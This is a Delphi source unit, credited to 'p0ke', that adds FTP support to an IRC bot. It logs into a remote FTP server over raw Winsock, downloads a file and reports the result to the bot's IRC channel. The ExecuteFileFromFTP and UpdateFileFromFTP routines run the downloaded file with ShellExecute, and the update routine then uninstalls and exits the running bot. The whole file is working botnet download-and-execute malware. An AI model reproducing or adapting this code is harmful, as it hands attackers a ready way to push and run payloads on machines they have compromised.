(*
  FTP Support.
  This pas was written by p0ke.
  If you use it, make sure to put credit where credit is due.

  This procedure can download, update and execute files from ftp-servers.
  Coded in pure winsock api.
*)

unit untFTPa;

interface

uses
  Windows, Winsock, untFunctions, ShellApi;

{$I stubbos_config.ini}

var
  Sock          :TSocket;
  Addr          :TSockAddr;
  WSA           :TWSAData;
  FileSize      :Integer;

  dFileName     :String;
  dPort         :Integer;

  Procedure DownloadFileFromFTP(dUser, dPass, dHost, dTo: String; dPort: Integer);
  Procedure ExecuteFileFromFTP(dUser, dPass, dHost, dTo: String; dPort: Integer);
  Procedure UpdateFileFromFTP(dUser, dPass, dHost, dTo: String; dPort: Integer);

implementation

uses
  untBot;

Function FTPReceive(_Sock: TSocket): Integer;
Var
  TimeOut       :TimeVal;
  FD_Struct     :TFDSet;
Begin
  TimeOut.tv_sec := 120;
  TimeOut.tv_usec :=  0;

  FD_ZERO(FD_STRUCT);
  FD_SET (_Sock, FD_STRUCT);

  IF (Select(0, @FD_STRUCT, NIL, NIL, @TIMEOUT) <= 0) Then
  Begin
    CloseSocket(_Sock);
    Result := -1;
    Exit;
  End;
  Result := 0;
End;


Function ConnectToFTP(Host: String; Port: Integer): Bool;
Begin
  Host := ResolveIP(Host);

  CloseSocket(Sock);

  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(Port);
  Addr.sin_addr.S_addr := inet_addr(pchar(Host));

  If (Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS) Then
  Result := True Else Result := False;
End;

Procedure ReceiveFile;
Const
  WM_USER       = 1024;
Var
  Data          :String;

  iSock         :TSocket;
  cSock         :TSocket;
  iSsin         :TSockAddrIn;
  cSsin         :TSockAddr;

  Size          :Integer;
  rSize         :Integer;
  Buffer        :Array[0..1514] Of Char;
  F             :File Of Char;

  Start         :Integer;
  Speed         :Integer;
  Total         :Integer;
Begin
  iSock := Socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  WSAASYNCSELECT(iSock, 0, WM_USER + 1, FD_READ);

  FillChar(iSsin, SizeOf(iSsin), 0);
  iSsin.sin_family := AF_INET;
  iSsin.sin_port := hTons(dPort);
  Bind(iSock, iSsin, SizeOf(iSsin));

  While TRUE Do
  Begin
    If (Listen(iSock, 10) = SOCKET_ERROR) Then Exit;
    Size := SizeOf(TSockAddr);
    cSock := Accept(iSock, @cSsin, @Size);
    If (cSock <> INVALID_SOCKET) Then Break;
  End;

  Repeat
    Sleep(100);
  Until FileSize > 0;

  AssignFile(F, dFileName);
  ReWrite(F);

  rSize := 0;
  Total := 1;
  Start := GetTickCount;

  Repeat
    If (FTPReceive(cSock) = 0) Then
      rSize := Recv(cSock, Buffer, Length(Buffer), 0);
    Total := Total + rSize;
    Dec(FileSize, rSize);
    If (rSize > 0) Then
    Begin
      BlockWrite(F, Buffer, rSize);
    End;
  Until (FileSize <= 0);
  CloseFile(F);

  Speed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);

  Data := 'PRIVMSG ' + BOT.Channel + ' :[FTP] Downloaded '+ GetKBS(Total) +' To ' + dFilename + ' in ' + GetKBS(Speed) + '/s'#10;
  BOT.SendData(Data, FALSE, BOT.IRC.Sock);

  CloseSocket(cSock);
  CloseSocket(iSock);
  CloseSocket(Sock );
End;

Function DownloadFile(User, Pass, Host: String; Port: Integer; SaveTo: String): Bool;
Var
  Data          :String;
  Buf           :String;
  Buffer        :Array[0..1514] Of Char;

  SubHost       :String;
  FileName      :String;
  IPPort        :String;

  TransferPort  :Integer;
  Port1         :Integer;
  Port2         :Integer;

  SockAddrIn    :TSockAddrIn;
  SockAddr      :TSockAddr;
  Size          :Integer;

  ThreadID      :Dword;
Begin
  If (Host = '') Then Exit;
  If (Host[Length(Host)] = '/') Then Delete(Host, Length(Host), 1);
  If (LowerCase(Copy(Host, 1, 3)) = 'ftp') Then Delete(Host, 1, 6);
  If (Pos('/', Host) > 0) Then
  Begin
    SubHost := Copy(Host, Pos('/', Host), Length(Host));
    Host := Copy(Host, 1, Pos('/', Host)-1);
  End;

  If (SubHost <> '') Then
  Begin
    ReplaceStr('/', '\', SubHost);
    FileName := ExtractFileName(SubHost);
    SubHost := Copy(SubHost, 1, Length(SubHost)-Length(FileName));
    ReplaceStr('\', '/', SubHost);
  End;

  {$IFDEF SHOW_OUTPUT} WriteLn('[FTP] Starting..'); {$ENDIF}  

  If (ConnectToFTP(Host, Port)) Then
  Begin
    While (FTPReceive(Sock) = 0) Do
    Begin
      ZeroMemory(@Buffer, SizeOf(Buffer));
      Recv(Sock, Buffer, 1514, 0);
      Buf := String(Buffer);

      {$IFDEF SHOW_OUTPUT} WriteLn('[FTP] '+Buf); {$ENDIF}

      If (Copy(Buf, 1, 3) = '220') Then
      Begin
        Data := 'USER '+User+#13#10;
        Send(Sock, Data[1], Length(Data), 0);
      End;

      If (Copy(Buf, 1, 3) = '331') Then
      Begin
        Data := 'PASS '+Pass+#13#10;
        Send(Sock, Data[1], Length(Data), 0);
      End;

      If (Copy(Buf, 1, 3) = '230') Then
      Begin
        Data := 'FEAT'#13#10;
        Send(Sock, Data[1], Length(Data), 0);
      End;

      If (Copy(Buf, 1, 4) = '211 ') Then
      Begin
        Data := 'CWD /'+SubHost+#13#10;
        Send(Sock, Data[1], Length(Data), 0);
      End;

      If (Copy(Buf, 1, 3) = '250') Then
      Begin
        Data := 'PWD'#13#10;
        Send(Sock, Data[1], Length(Data), 0);
      End;

      If (Copy(Buf, 1, 3) = '501') Then
      Begin
        Data := 'PASV'#13#10;
        Send(Sock, Data[1], Length(Data), 0);
      End;

      If (Copy(Buf, 1, 3) = '257') Then
      Begin
        Data := 'PASV'#13#10;
        Send(Sock, Data[1], Length(Data), 0);

        Sleep(500);

        Data := 'TYPE I'#13#10;
        Send(Sock, Data[1], Length(Data), 0);
      End;

      If (Copy(Buf, 1, 3) = '227') Then
      Begin
        Buf := Copy(Buf, Pos('(', Buf)+1, Length(Buf));
        Buf := Copy(Buf, 1, Pos(')', Buf)-1);
        { 1,2,3,4,5,6 }
        Delete(Buf, 1, Pos(',', Buf));
        Delete(Buf, 1, Pos(',', Buf));
        Delete(Buf, 1, Pos(',', Buf));
        Delete(Buf, 1, Pos(',', Buf));

        Port1 := StrToInt(Copy(Buf, 1, Pos(',', Buf)-1));
        Delete(Buf, 1, Pos(',', Buf));
        Port2 := StrToInt(Buf);

        TransferPort := Port1 * 256 + Port2;
      End;

      If (Copy(Buf, 1, 5) = '200 T') Then
      Begin
        IPPort := ResolveIP('');
        ReplaceStr('.',',',IPPort);

        Data := 'PORT ' + IPPORT + ',' + IntToStr(Port1) +',' + IntToStr(Port2)+ #13#10;
        Send(Sock, Data[1], Length(Data), 0);
      End;

      If (Copy(Buf, 1, 5) = '200 P') Then
      Begin
        Data := 'RETR '+FileName+#13#10;
        Send(Sock, Data[1], Length(Data), 0);
        dPort := Port1*256+Port2;
        dFileName := FileName;

        CreateThread(NIL, 0, @ReceiveFile, NIL, 0, ThreadID);
      End;

      If (Copy(Buf, 1, 3) = '150') Then
      Begin
        Data := Copy(Buf, Pos('(', Buf)+1, Length(Buf));
        Data := Copy(Data, 1, pos(' ', Data)-1);
        FileSize := StrToInt(Data);
      End;

      If (Copy(Buf, 1, 3) = '226') Then
      Begin
        Result := True;
        CloseSocket(Sock);
      End;

    End;
    WSACleanUp;
    CloseSocket(Sock);
  End;
End;

Procedure DownloadFileFromFTP(dUser, dPass, dHost, dTo: String; dPort: Integer);
Var
  Data  :String;
Begin
  Data := 'PRIVMSG ' + BOT.Channel + ' :[FTP] Downloading (' + dHost + ')'#10;
  BOT.SendData(Data, FALSE, BOT.IRC.Sock);
  DownloadFile(dUser, dPass, dHost, dPort, dTo);
End;

Procedure ExecuteFileFromFTP(dUser, dPass, dHost, dTo: String; dPort: Integer);
Var
  Data  :String;
Begin
  Data := 'PRIVMSG ' + BOT.Channel + ' :[FTP] Downloading (' + dHost + ')'#10;
  BOT.SendData(Data, FALSE, BOT.IRC.Sock);
  DownloadFile(dUser, dPass, dHost, dPort, dTo);
  If (FileExists(dTo)) Then
    ShellExecute(0, 'open', pChar(dTo), nil, nil, 1);
End;

Procedure UpdateFileFromFTP(dUser, dPass, dHost, dTo: String; dPort: Integer);
Var
  Data  :String;
Begin
  Data := 'PRIVMSG ' + BOT.Channel + ' :[FTP] Updating (' + dHost + ')'#10;
  BOT.SendData(Data, FALSE, BOT.IRC.Sock);
  DownloadFile(dUser, dPass, dHost, dPort, dTo);
  If (FileExists(dTo)) Then
  Begin
    ShellExecute(0, 'open', pChar(dTo), nil, nil, 1);
    DoUninstall;
    WSACleanUP;
    ExitProcess(0);
  End;
End;

end.
